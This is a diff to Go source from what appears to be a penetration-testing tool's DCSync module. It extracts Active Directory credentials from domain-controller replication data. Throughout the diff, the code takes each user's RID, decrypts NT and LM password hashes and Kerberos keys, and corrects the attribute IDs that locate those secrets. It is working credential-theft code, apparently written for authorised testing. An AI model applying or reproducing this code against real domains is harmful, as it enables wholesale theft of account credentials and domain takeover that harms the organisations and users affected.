@@ -271,7 +271,6 @@ func (c *DRSUAPIClient) tryFallbackWithCrackNames(ctx context.Context, username 
 	return c.client.GetNCChanges(ctx, getChangesReq)
 }
 
-// ExtractUserCredentials extracts credentials from DRSUAPI replication data
 func (c *DRSUAPIClient) ExtractUserCredentials(ctx context.Context, username, domain string, resp *drsuapi.GetNCChangesResponse, config *msrpcfern.PentestMsrpcDcSyncConfig) (*msrpcfern.DcSyncUserEntry, error) {
 	log := svc1log.FromContext(ctx)
 	v6Reply, ok := resp.Out.Value.(*drsuapi.MessageGetNCChangesReply_V6)
@@ -291,15 +290,12 @@ func (c *DRSUAPIClient) ExtractUserCredentials(ctx context.Context, username, do
 		UserPrincipalName: &[]string{fmt.Sprintf("%s@%s", username, domain)}[0],
 	}
 
-	// Extract RID from objectSid for hash decryption - process SID first
 	var userRID uint32
 
-	// Process attributes from the replication object
 	if obj.EntityInfo == nil || obj.EntityInfo.AttributeBlock == nil {
 		return nil, fmt.Errorf("no attribute data for user %s", username)
 	}
 
-	// FIRST PASS: Extract RID from objectSid (MUST be done before decrypting hashes)
 	for _, attr := range obj.EntityInfo.AttributeBlock.Attribute {
 		if attr.AttributeType == 0x90092 { // objectSid
 			if attr.AttributeValue != nil && len(attr.AttributeValue.Values) > 0 {
@@ -308,13 +304,10 @@ func (c *DRSUAPIClient) ExtractUserCredentials(ctx context.Context, username, do
 					svc1log.SafeParam("sidBytesHex", hex.EncodeToString(sidBytes)),
 					svc1log.SafeParam("sidLength", len(sidBytes)))
 
-				// Parse SID structure
 				var sid dtyp.SID
 				if err := ndr.Unmarshal(sidBytes, &sid, ndr.Opaque); err == nil {
-					// Extract RID from SID
 					if len(sid.SubAuthority) > 0 {
 						userRID = sid.SubAuthority[len(sid.SubAuthority)-1]
-						// Store the SID string in the user entry
 						sidStr := sid.String()
 						userEntry.ObjectSid = &sidStr
 						log.Debug("Extracted RID from parsed SID",
@@ -331,23 +324,18 @@ func (c *DRSUAPIClient) ExtractUserCredentials(ctx context.Context, username, do
 						svc1log.SafeParam("error", err.Error()),
 						svc1log.SafeParam("username", username))
 				}
-				break // Found SID, stop looking
+				break
 			}
 		}
 	}
 
-	// SECOND PASS: Process all other attributes including password hashes (now we have RID)
-	var hasUnicodePwd bool
 	for _, attr := range obj.EntityInfo.AttributeBlock.Attribute {
 		switch attr.AttributeType {
-		case 0x90092: // objectSid - already processed in first pass
-			// Skip - RID already extracted in first pass
-		case 0x9005E: // unicodePwd (NT hash)
-			hasUnicodePwd = true
+		case 0x90092: // objectSid
+		case 0x9005A: // unicodePwd
 			if attr.AttributeValue != nil && len(attr.AttributeValue.Values) > 0 {
 				rawNtHashBytes := attr.AttributeValue.Values[0].Value
 
-				// Decrypt hash using session key
 				decryptedHashBytes, err := drsuapi.DecryptHash(c.client.Conn().Context(), userRID, rawNtHashBytes)
 				if err != nil {
 					log.Error("DecryptHash failed",
@@ -358,8 +346,6 @@ func (c *DRSUAPIClient) ExtractUserCredentials(ctx context.Context, username, do
 					continue
 				}
 
-				// NT hash should be exactly 16 bytes (128 bits)
-				// If we get more data, take the first 16 bytes
 				var ntHashBytes []byte
 				if len(decryptedHashBytes) >= 16 {
 					ntHashBytes = decryptedHashBytes[:16]
@@ -369,35 +355,25 @@ func (c *DRSUAPIClient) ExtractUserCredentials(ctx context.Context, username, do
 
 				decryptedHash := hex.EncodeToString(ntHashBytes)
 				userEntry.NtHash = &decryptedHash
-			} else {
-				// Handle empty unicodePwd attribute (disabled accounts)
-				emptyPasswordHash := "31d6cfe0d16ae931b73c59d7e0c089c0"
-				userEntry.NtHash = &emptyPasswordHash
 			}
-		case 0x90054: // dBCSPwd (LM hash)
+		case 0x90037: // dBCSPwd
 			if attr.AttributeValue != nil && len(attr.AttributeValue.Values) > 0 {
 				rawLmHashBytes := attr.AttributeValue.Values[0].Value
-				// Use DRSUAPI session-based decryption for LM hash
-				decryptedLmHashBytes, err := drsuapi.DecryptHash(c.conn.Context(), userRID, rawLmHashBytes)
+				decryptedLmHashBytes, err := drsuapi.DecryptHash(c.client.Conn().Context(), userRID, rawLmHashBytes)
 				if err != nil {
 					log.Debug("Failed to decrypt LM hash with go-msrpc DecryptHash",
 						svc1log.SafeParam("error", err.Error()),
 						svc1log.SafeParam("username", username))
-					// Fallback to raw encrypted data
-					lmHash := hex.EncodeToString(rawLmHashBytes)
-					userEntry.LmHash = &lmHash
 				} else {
 					lmHash := hex.EncodeToString(decryptedLmHashBytes)
 					userEntry.LmHash = &lmHash
 				}
 			}
-		case 0x9005D: // ntPwdHistory - removed from schema
-			// Skip password history processing
+		case 0x9005E: // ntPwdHistory
 		case 0x9007D: // supplementalCredentials
 			if attr.AttributeValue != nil && len(attr.AttributeValue.Values) > 0 {
 				rawSupplementalCredentials := attr.AttributeValue.Values[0].Value
 
-				// Decrypt supplemental credentials using DRSUAPI session key
 				decryptedSupplementalCreds, err := drsuapi.DecryptData(c.client.Conn().Context(), rawSupplementalCredentials)
 				if err != nil {
 					log.Error("Failed to decrypt supplemental credentials",
@@ -406,16 +382,9 @@ func (c *DRSUAPIClient) ExtractUserCredentials(ctx context.Context, username, do
 					continue
 				}
 
-				// Parse Kerberos keys from decrypted supplemental credentials
 				userEntry.KerberosKeys = ParseKerberosKeys(ctx, decryptedSupplementalCreds, username)
 			}
 		}
-	}
-
-	// Handle users with no password data (disabled accounts)
-	if !hasUnicodePwd {
-		emptyPasswordHash := "31d6cfe0d16ae931b73c59d7e0c089c0" // NT hash for empty password
-		userEntry.NtHash = &emptyPasswordHash
 	}
 
 	return userEntry, nil
